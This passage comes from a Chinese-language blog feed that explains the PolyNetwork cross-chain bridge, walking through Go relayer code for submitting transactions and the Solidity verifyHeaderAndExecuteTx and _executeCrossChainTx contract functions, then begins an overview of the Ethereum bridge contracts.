&gt; <span class="number">0</span> &amp;&amp; tx.DstHash != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">				bus.SafeCall(s.Context, tx, <span class="string">&quot;push to delay queue&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">error</span> &#123; <span class="keyword">return</span> delay.Delay(context.Background(), tx, tsp) &#125;)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>relayer随后调用ProcessTx()函数，对对应的跨链函数进行处理，这里会检验对应的跨链交易是否已经传递给了目标链，随后会构造调用以太坊上’verifyHeaderAndExecuteTx’函数的数据，将其存储到对应的tx数据之中。</p>
<p>poly-relayer/relayer/eth/eth.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Submitter)</span></span> processPolyTx(tx *msg.Tx) (err <span class="type">error</span>) &#123;</span><br><span class="line">	ccd, err := eccd_abi.NewEthCrossChainData(s.ccd, s.sdk.Node())</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	txId := [<span class="number">32</span>]<span class="type">byte</span>&#123;&#125;</span><br><span class="line">	<span class="built_in">copy</span>(txId[:], tx.MerkleValue.TxHash[:<span class="number">32</span>])</span><br><span class="line">	exist, err := ccd.CheckIfFromChainTxExist(<span class="literal">nil</span>, tx.SrcChainId, txId)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> exist &#123;</span><br><span class="line">		log.Info(<span class="string">&quot;ProcessPolyTx dst tx already relayed, tx id occupied&quot;</span>, <span class="string">&quot;chain&quot;</span>, s.name, <span class="string">&quot;poly_hash&quot;</span>, tx.PolyHash)</span><br><span class="line">		tx.DstHash = <span class="string">&quot;&quot;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	proof, err := hex.DecodeString(tx.AnchorProof)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%s processPolyTx decode anchor proof hex error %v&quot;</span>, s.name, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> anchor []<span class="type">byte</span></span><br><span class="line">	<span class="keyword">if</span> tx.AnchorHeader != <span class="literal">nil</span> &#123;</span><br><span class="line">		anchor = tx.AnchorHeader.GetMessage()</span><br><span class="line">	&#125;</span><br><span class="line">	path, err := hex.DecodeString(tx.AuditPath)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%s failed to decode audit path %v&quot;</span>, s.name, err)</span><br><span class="line">	&#125;</span><br><span class="line">	tx.DstData, err = s.abi.Pack(<span class="string">&quot;verifyHeaderAndExecuteTx&quot;</span>, path, tx.PolyHeader.GetMessage(), proof, anchor, tx.PolySigs)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		err = fmt.Errorf(<span class="string">&quot;%s processPolyTx pack tx error %v&quot;</span>, s.name, err)</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Submitter)</span></span> ProcessTx(m *msg.Tx, compose msg.PolyComposer) (err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> m.Type() != msg.POLY &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%s desired message is not poly tx %v&quot;</span>, m.Type())</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> m.DstChainId != s.config.ChainId &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%s message dst chain does not match %v&quot;</span>, m.DstChainId)</span><br><span class="line">	&#125;</span><br><span class="line">	m.DstPolyEpochStartHeight, err = s.GetPolyEpochStartHeight()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%s fetch dst chain poly epoch height error %v&quot;</span>, s.name, err)</span><br><span class="line">	&#125;</span><br><span class="line">	m.DstPolyKeepers, err = s.GetPolyKeepers()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%s fetch dst chain poly keepers error %v&quot;</span>, s.name, err)</span><br><span class="line">	&#125;</span><br><span class="line">	err = compose(m)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	err = s.processPolyTx(m)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CheckIfFromChainTxExist is a free data retrieval call binding the contract method 0x0586763c.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Solidity: function checkIfFromChainTxExist(uint64 fromChainId, bytes32 fromChainTx) view returns(bool)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(_EthCrossChainData *EthCrossChainDataCaller)</span></span> CheckIfFromChainTxExist(opts *bind.CallOpts, fromChainId <span class="type">uint64</span>, fromChainTx [<span class="number">32</span>]<span class="type">byte</span>) (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		ret0 = <span class="built_in">new</span>(<span class="type">bool</span>)</span><br><span class="line">	)</span><br><span class="line">	out := ret0</span><br><span class="line">	err := _EthCrossChainData.contract.Call(opts, out, <span class="string">&quot;checkIfFromChainTxExist&quot;</span>, fromChainId, fromChainTx)</span><br><span class="line">	<span class="keyword">return</span> *ret0, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>relayer将对应的交易数据构造处理后之后，调用对应的SubmitTx()函数，来将对应的交易信息传递给目标链。</p>
<p>poly-relayer/relayer/eth/eth.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Submitter)</span></span> SubmitTx(tx *msg.Tx) (err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">switch</span> v := tx.DstSender.(<span class="keyword">type</span>) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="type">string</span>:</span><br><span class="line">		<span class="keyword">for</span> _, a := <span class="keyword">range</span> s.wallet.Accounts() &#123;</span><br><span class="line">			<span class="keyword">if</span> util.LowerHex(a.Address.String()) == util.LowerHex(v) &#123;</span><br><span class="line">				tx.DstSender = &amp;a</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	err = s.submit(tx)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		info := err.Error()</span><br><span class="line">		<span class="keyword">if</span> strings.Contains(info, <span class="string">&quot;business contract failed&quot;</span>) &#123;</span><br><span class="line">			err = fmt.Errorf(<span class="string">&quot;%w tx exec error %v&quot;</span>, msg.ERR_TX_EXEC_FAILURE, err)</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> strings.Contains(info, <span class="string">&quot;higher than max limit&quot;</span>) || strings.Contains(info, <span class="string">&quot;max limit is zero or missing&quot;</span>) &#123;</span><br><span class="line">			err = fmt.Errorf(<span class="string">&quot;%w %v&quot;</span>, msg.ERR_PAID_FEE_TOO_LOW, err)</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> strings.Contains(info, <span class="string">&quot;always failing&quot;</span>) &#123;</span><br><span class="line">			err = fmt.Errorf(<span class="string">&quot;%w tx exec error %v&quot;</span>, msg.ERR_TX_EXEC_ALWAYS_FAIL, err)</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> strings.Contains(info, <span class="string">&quot;insufficient funds&quot;</span>) || strings.Contains(info, <span class="string">&quot;exceeds allowance&quot;</span>) &#123;</span><br><span class="line">			err = msg.ERR_LOW_BALANCE</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用submit()函数将，在目标链上发起对应的跨链交易。</p>
<p>poly-relayer/relayer/eth/eth.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Submitter)</span></span> submit(tx *msg.Tx) <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(tx.DstData) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		gasPrice  *big.Int</span><br><span class="line">		gasPriceX *big.Float</span><br><span class="line">		ok        <span class="type">bool</span></span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">if</span> tx.DstGasPrice != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		gasPrice, ok = <span class="built_in">new</span>(big.Int).SetString(tx.DstGasPrice, <span class="number">10</span>)</span><br><span class="line">		<span class="keyword">if</span> !ok &#123;</span><br><span class="line">			<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%s submit invalid gas price %s&quot;</span>, tx.DstGasPrice)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> tx.DstGasPriceX != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		gasPriceX, ok = <span class="built_in">new</span>(big.Float).SetString(tx.DstGasPriceX)</span><br><span class="line">		<span class="keyword">if</span> !ok &#123;</span><br><span class="line">			<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%s submit invalid gas priceX %s&quot;</span>, tx.DstGasPriceX)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		err     <span class="type">error</span></span><br><span class="line">		account accounts.Account</span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">if</span> tx.DstSender != <span class="literal">nil</span> &#123;</span><br><span class="line">		acc := tx.DstSender.(*accounts.Account)</span><br><span class="line">		account = *acc</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		account, _, _ = s.wallet.Select()</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> tx.CheckFeeOff || tx.CheckFeeStatus != bridge.PAID_LIMIT &#123;</span><br><span class="line">		tx.DstHash, err = s.wallet.SendWithAccount(account, s.ccm, big.NewInt(<span class="number">0</span>), tx.DstGasLimit, gasPrice, gasPriceX, tx.DstData)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		maxLimit, _ := big.NewFloat(tx.PaidGas).Int(<span class="literal">nil</span>)</span><br><span class="line">		tx.DstHash, err = s.wallet.SendWithMaxLimit(s.sdk.ChainID, account, s.ccm, big.NewInt(<span class="number">0</span>), maxLimit, gasPrice, gasPriceX, tx.DstData)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用SendWithAccount()向以太坊上发送对应的交易</p>
<p>bridge-common/wallet/eth.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> gasPrice, gasPriceX used as gas tip here!</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *EthWallet)</span></span> SendWithAccount(account accounts.Account, addr common.Address, amount *big.Int, gasLimit <span class="type">uint64</span>, gasPrice *big.Int, gasPriceX *big.Float, data []<span class="type">byte</span>) (hash <span class="type">string</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> gasPrice == <span class="literal">nil</span> || gasPrice.Sign() &lt;= <span class="number">0</span> &#123;</span><br><span class="line">		gasPrice, err = w.GasTip()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			err = fmt.Errorf(<span class="string">&quot;Get gas tip error %v&quot;</span>, err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> gasPriceX != <span class="literal">nil</span> &#123;</span><br><span class="line">			gasPrice, _ = <span class="built_in">new</span>(big.Float).Mul(<span class="built_in">new</span>(big.Float).SetInt(gasPrice), gasPriceX).Int(<span class="literal">nil</span>)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	gasCap, err := w.GasPrice()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		err = fmt.Errorf(<span class="string">&quot;Get gas price error %v&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Make this configurable</span></span><br><span class="line">	gasCap = big.NewInt(<span class="number">0</span>).Quo(big.NewInt(<span class="number">0</span>).Mul(gasCap, big.NewInt(<span class="number">30</span>)), big.NewInt(<span class="number">10</span>)) <span class="comment">// max gas price</span></span><br><span class="line"></span><br><span class="line">	provider, nonces := w.GetAccount(account)</span><br><span class="line">	nonce, err := nonces.Acquire()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> gasLimit == <span class="number">0</span> &#123;</span><br><span class="line">		msg := ethereum.CallMsg&#123;</span><br><span class="line">			From: account.Address, To: &amp;addr, Value: big.NewInt(<span class="number">0</span>), Data: data,</span><br><span class="line">			GasFeeCap: gasCap, GasTipCap: gasPrice,</span><br><span class="line">		&#125;</span><br><span class="line">		gasLimit, err = w.sdk.Node().EstimateGas(context.Background(), msg)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			nonces.Update(<span class="literal">false</span>)</span><br><span class="line">			<span class="keyword">if</span> strings.Contains(err.Error(), <span class="string">&quot;has been executed&quot;</span>) &#123;</span><br><span class="line">				log.Info(<span class="string">&quot;Transaction already executed&quot;</span>)</span><br><span class="line">				<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="literal">nil</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, fmt.Errorf(<span class="string">&quot;Estimate gas limit error %v&quot;</span>, err)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	gasLimit = <span class="type">uint64</span>(<span class="number">1.3</span> * <span class="type">float32</span>(gasLimit))</span><br><span class="line">	limit := GetChainGasLimit(w.chainId, gasLimit)</span><br><span class="line">	<span class="keyword">if</span> limit &lt; gasLimit &#123;</span><br><span class="line">		nonces.Update(<span class="literal">false</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, fmt.Errorf(<span class="string">&quot;Send tx estimated gas limit(%v) higher than max %v&quot;</span>, gasLimit, limit)</span><br><span class="line">	&#125;</span><br><span class="line">	tx := types.NewTx(&amp;types.DynamicFeeTx&#123;</span><br><span class="line">		Nonce:     nonce,</span><br><span class="line">		GasTipCap: gasPrice,</span><br><span class="line">		GasFeeCap: gasCap,</span><br><span class="line">		Gas:       limit,</span><br><span class="line">		To:        &amp;addr,</span><br><span class="line">		Value:     amount,</span><br><span class="line">		Data:      data,</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="comment">// tx := types.NewTransaction(nonce, addr, amount, limit, gasPrice, data)</span></span><br><span class="line">	tx, err = provider.SignTx(account, tx, big.NewInt(<span class="type">int64</span>(w.chainId)))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		nonces.Update(<span class="literal">false</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, fmt.Errorf(<span class="string">&quot;Sign tx error %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	log.Info(<span class="string">&quot;Compose dst chain tx&quot;</span>, <span class="string">&quot;hash&quot;</span>, tx.Hash(), <span class="string">&quot;account&quot;</span>, account.Address, <span class="string">&quot;nonce&quot;</span>, tx.Nonce(), <span class="string">&quot;limit&quot;</span>, tx.Gas(), <span class="string">&quot;gasPrice&quot;</span>, tx.GasPrice())</span><br><span class="line">	err = w.sdk.Node().SendTransaction(context.Background(), tx)</span><br><span class="line">	<span class="comment">//<span class="doctag">TODO:</span> Check err here before update nonces</span></span><br><span class="line">	nonces.Update(<span class="literal">true</span>)</span><br><span class="line">	<span class="keyword">return</span> tx.Hash().String(), err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>go-ethereum/ethclient/ethclient.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ec *Client)</span></span> SendTransaction(ctx context.Context, tx *types.Transaction) <span class="type">error</span> &#123;</span><br><span class="line">	data, err := tx.MarshalBinary()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ec.c.CallContext(ctx, <span class="literal">nil</span>, <span class="string">&quot;eth_sendRawTransaction&quot;</span>, hexutil.Encode(data))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过json-rpc接口，发起在以太坊上的函数调用</p>
<p>go-ethereum/rpc/client.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CallContext performs a JSON-RPC call with the given arguments. If the context is</span></span><br><span class="line"><span class="comment">// canceled before the call has successfully returned, CallContext returns immediately.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The result must be a pointer so that package json can unmarshal into it. You</span></span><br><span class="line"><span class="comment">// can also pass nil, in which case the result is ignored.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Client)</span></span> CallContext(ctx context.Context, result <span class="keyword">interface</span>&#123;&#125;, method <span class="type">string</span>, args ...<span class="keyword">interface</span>&#123;&#125;) <span class="type">error</span> &#123;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="目标链"><a href="#目标链" class="headerlink" title="目标链"></a>目标链</h3><p>验证对应的区块头和<strong>Merkle proof</strong> ，验证通过，交易在目标链上执行。</p>
<ul>
<li>中继器调用该函数，一些情况，用户从<strong>Poly</strong>链获取有效的块信息，自行调用该方法</li>
<li>该方法获取并处理跨链交易，得到对应交易的<strong>Merkle</strong>根，使用交易参数来验证交易的合法性</li>
<li>验证Poly Chain区块头和证明后，检查参数<strong>toContract</strong> 和<strong>toMerkleValue.makeTxParam.method</strong> 是否已经在白名单中</li>
<li><p>然后调用部署在目标链上的业务逻辑合约，通过内部方法<strong>_executeCrossChainTx()</strong>对业务逻辑合约进行处理：</p>
<ul>
<li>该方法旨在调用目标合约并触发目标链上跨链交易的执行。</li>
<li>首先，您需要确保目标合约正在等待调用合约而不是标准账户地址。</li>
<li>然后构造一个目标业务逻辑契约方法：需要对_method和输入数据格式“(bytes,bytes,uint64)”进行<strong>encodePacked</strong></li>
<li>然后它会<strong>keccak256</strong>编码的字符串，使用 <strong>bytes4</strong> 获取函数调用的调用数据的前四个字节，指定要调用的函数。</li>
</ul>
</li>
<li><p>调用方法后，需要检查返回值。  只有返回值为真，整个跨链交易才会执行成功</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*  </span><br><span class="line"> *  @param proof                  Poly chain transaction Merkle proof</span><br><span class="line"> *  @param rawHeader              The header containing crossStateRoot to verify the above tx Merkle proof</span><br><span class="line"> *  @param headerProof            The header Merkle proof used to verify rawHeader</span><br><span class="line"> *  @param curRawHeader           Any header in current epoch consensus of Poly chain</span><br><span class="line"> *  @param headerSig              The converted signature variable for solidity derived from Poly chain consensus nodes&#x27; signature </span><br><span class="line"> *                                used to verify the validity of curRawHeader</span><br><span class="line"> *  @return                       true or false</span><br><span class="line">*/</span><br><span class="line">function verifyHeaderAndExecuteTx(bytes memory proof, bytes memory rawHeader, bytes memory headerProof, bytes memory curRawHeader,bytes memory headerSig) whenNotPaused public returns (bool)&#123;</span><br><span class="line">    ECCUtils.Header memory header = ECCUtils.deserializeHeader(rawHeader);</span><br><span class="line">    // Load ehereum cross chain data contract</span><br><span class="line">    IEthCrossChainData eccd = IEthCrossChainData(EthCrossChainDataAddress);</span><br><span class="line"></span><br><span class="line">    // Get stored consensus public key bytes of current Poly chain epoch and deserialize Poly chain consensus public key bytes to address[]</span><br><span class="line">    address[] memory polyChainBKs = ECCUtils.deserializeKeepers(eccd.getCurEpochConPubKeyBytes());</span><br><span class="line"></span><br><span class="line">    uint256 curEpochStartHeight = eccd.getCurEpochStartHeight();</span><br><span class="line"></span><br><span class="line">    uint n = polyChainBKs.length;</span><br><span class="line">    if (header.height &gt;= curEpochStartHeight) &#123;</span><br><span class="line">        // It&#x27;s enough to verify rawHeader signature</span><br><span class="line">        require(ECCUtils.verifySig(rawHeader, headerSig, polyChainBKs, n - ( n - 1) / 3), &quot;Verify Poly chain header signature failed!&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // We need to verify the signature of curHeader </span><br><span class="line">        require(ECCUtils.verifySig(curRawHeader, headerSig, polyChainBKs, n - ( n - 1) / 3), &quot;Verify Poly chain current epoch header signature failed!&quot;);</span><br><span class="line"></span><br><span class="line">        // Then use curHeader.StateRoot and headerProof to verify rawHeader.CrossStateRoot</span><br><span class="line">        ECCUtils.Header memory curHeader = ECCUtils.deserializeHeader(curRawHeader);</span><br><span class="line">        bytes memory proveValue = ECCUtils.MerkleProve(headerProof, curHeader.blockRoot);</span><br><span class="line">        require(ECCUtils.getHeaderHash(rawHeader) == Utils.bytesToBytes32(proveValue), &quot;verify header proof failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Through rawHeader.CrossStatesRoot, the toMerkleValue or cross chain msg can be verified and parsed from proof</span><br><span class="line">    bytes memory toMerkleValueBs = ECCUtils.MerkleProve(proof, header.crossStatesRoot);</span><br><span class="line"></span><br><span class="line">    // Parse the toMerkleValue struct and make sure the tx has not been processed, then mark this tx as processed</span><br><span class="line">    ECCUtils.ToMerkleValue memory toMerkleValue = ECCUtils.deserializeMerkleValue(toMerkleValueBs);</span><br><span class="line">    require(!eccd.checkIfFromChainTxExist(toMerkleValue.fromChainID, Utils.bytesToBytes32(toMerkleValue.txHash)), &quot;the transaction has been executed!&quot;);</span><br><span class="line">    require(eccd.markFromChainTxExist(toMerkleValue.fromChainID, Utils.bytesToBytes32(toMerkleValue.txHash)), &quot;Save crosschain tx exist failed!&quot;);</span><br><span class="line"></span><br><span class="line">    // Ethereum ChainId is 2, we need to check the transaction is for Ethereum network</span><br><span class="line">    require(toMerkleValue.makeTxParam.toChainId == chainId, &quot;This Tx is not aiming at this network!&quot;);</span><br><span class="line"></span><br><span class="line">    // Obtain the target contract, so that Ethereum cross chain manager contract can trigger the executation of cross chain tx on Ethereum side</span><br><span class="line">    address toContract = Utils.bytesToAddress(toMerkleValue.makeTxParam.toContract);</span><br><span class="line"></span><br><span class="line">    // only invoke PreWhiteListed Contract and method For Now</span><br><span class="line">    require(whiteListContractMethodMap[toContract][toMerkleValue.makeTxParam.method],&quot;Invalid to contract or method&quot;);</span><br><span class="line"></span><br><span class="line">    //TODO: check this part to make sure we commit the next line when doing local net UT test</span><br><span class="line">    require(_executeCrossChainTx(toContract, toMerkleValue.makeTxParam.method, toMerkleValue.makeTxParam.args, toMerkleValue.makeTxParam.fromContract, toMerkleValue.fromChainID), &quot;Execute CrossChain Tx failed!&quot;);</span><br><span class="line"></span><br><span class="line">    // Fire the cross chain event denoting the executation of cross chain tx is successful,</span><br><span class="line">    // and this tx is coming from other public chains to current Ethereum network</span><br><span class="line">    emit VerifyHeaderAndExecuteTxEvent(toMerkleValue.fromChainID, toMerkleValue.makeTxParam.toContract, toMerkleValue.txHash, toMerkleValue.makeTxParam.txHash);</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* </span><br><span class="line"> *  @notice                       Dynamically invoke the target contract, trigger execution of cross-chain tx </span><br><span class="line">                                  on Ethereum side</span><br><span class="line"> *  @param _toContract            the Ethereum Cross Chain Manager contract will invoke the target contract</span><br><span class="line"> *  @param _method                At which method will be invoked within the target contract</span><br><span class="line"> *  @param _args                  The parameter that will be passed into the target contract</span><br><span class="line"> *  @param _fromContractAddr      From chain smart contract address</span><br><span class="line"> *  @param _fromChainId           Indicate from which chain current cross-chain tx comes </span><br><span class="line"> *  @return                       true or false</span><br><span class="line">*/</span><br><span class="line">function _executeCrossChainTx(address _toContract, bytes memory _method, bytes memory _args, bytes memory _fromContractAddr, uint64 _fromChainId) internal returns (bool)&#123;</span><br><span class="line">    // Ensure the target contract gonna be invoked is indeed a contract rather than a normal account address</span><br><span class="line">    require(Utils.isContract(_toContract), &quot;The passed in address is not a contract!&quot;);</span><br><span class="line">    bytes memory returnData;</span><br><span class="line">    bool success;</span><br><span class="line"></span><br><span class="line">    // The returnData will be bytes32, the last byte must be 01;</span><br><span class="line">    (success, returnData) = _toContract.call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(bytes,bytes,uint64)&quot;))), abi.encode(_args, _fromContractAddr, _fromChainId)));</span><br><span class="line"></span><br><span class="line">    // Ensure the executation is successful</span><br><span class="line">    require(success == true, &quot;EthCrossChain call business contract failed&quot;);</span><br><span class="line"></span><br><span class="line">    // Ensure the returned value is true</span><br><span class="line">    require(returnData.length != 0, &quot;No return value from business contract!&quot;);</span><br><span class="line">    (bool res,) = ZeroCopySource.NextBool(returnData, 31);</span><br><span class="line">    require(res == true, &quot;EthCrossChain call business contract return is not true&quot;);</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>智能合约</category>
        <category>以太坊</category>
        <category>跨链桥</category>
      </categories>
      <tags>
        <tag>跨链桥</tag>
      </tags>
  </entry>
  <entry>
    <title>PolyNetwork以太坊智能合约介绍</title>
    <url>/2023/12/16/PolyNetwork%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="跨链智能合约介绍（eth-contracts）"><a href="#跨链智能合约介绍（eth-contracts）" class="headerlink" title="跨链智能合约介绍（eth-contracts）"></a>跨链智能合约介绍（eth-contracts）</h2><p>代码已经详细注释，参考PolyNetwork官网</p>
<p>跨链合约主要分为分为逻辑(logic)合约，数据(data)合约和代理(proxy)合约</p>
<ul>
<li><p>Cross Chain Manager Contract：CCM合约对应的是<code>EthCrossChainManager.sol</code></p>
</li>
<li><p>Cross Chain Data Contract：CCD合约对应的是<code>EthCrossChainData.sol</code></p>
</li>
<li><p>Cross Chain Manager Proxy Contract：CCMP合约对应的是<code>EthCrossChainManagerProxy.sol</code></p>
</li>
<li><p>Business Logic Contract：主要对应的是<code>LoxyProxy.sol</code><br><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202312161134666.png" alt="在这里插入图片描述"></p>
</li>
</ul>
<h2 id="跨链智能合约代码具体分析"><a href="#跨链智能合约代码具体分析" class="headerlink" title="跨链智能合约代码具体分析"></a>跨链智能合约代码具体分析</h2><h3 id="Business-Logic-Contract"><a href="#Business-Logic-Contract" class="headerlink" title="Business Logic Contract:"></a>Business Logic Contract:</h3><h4 id="LockProxy-sol"><a href="#LockProxy-sol" class="headerlink" title="LockProxy.sol"></a><code>LockProxy.sol</code></h4><p>代码github位置：polynetwork/eth-contracts/contracts/core/lock_proxy/LockProxy.sol</p>
<p><a href="https://github.com/polynetwork/eth-contracts/blob/master/contracts/core/lock_proxy/LockProxy.sol">https://github.com/polynetwork/eth-contracts/blob/master/contracts/core/lock_proxy/LockProxy.sol</a></p>
